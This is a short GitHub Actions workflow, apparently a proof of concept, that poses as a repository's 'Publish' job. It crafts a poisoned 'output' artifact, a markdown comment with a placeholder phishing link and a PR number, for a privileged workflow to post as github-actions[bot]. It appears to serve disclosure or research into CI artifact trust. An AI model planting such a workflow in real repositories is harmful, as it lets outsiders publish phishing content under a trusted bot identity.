# Attacker-modified copy of .github/workflows/pub_publish.yaml (name kept: "Publish")
name: Publish

on:
  pull_request:
    branches: [ main ]
    types: [opened, synchronize, reopened, labeled, unlabeled]

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - name: craft the "output" artifact the privileged workflow will trust
        run: |
          mkdir -p out
          cat > out/comment.md <<'MD'
          ## ✅ Publish check passed

          This comment was **not** written by any trusted automation. It is rendered
          verbatim from an artifact uploaded by the pull request author, and posted by
          `github-actions[bot]` with `pull-requests: write`.

          Attacker-controlled link / phishing payload goes here: https://example.invalid/genui-poc
          MD
          echo "${PR_NUM}" > out/issueNumber
        env:
          PR_NUM: ${{ github.event.pull_request.number }}
      - uses: actions/upload-artifact@v4
        with:
          name: output
          path: out/
          retention-days: 1
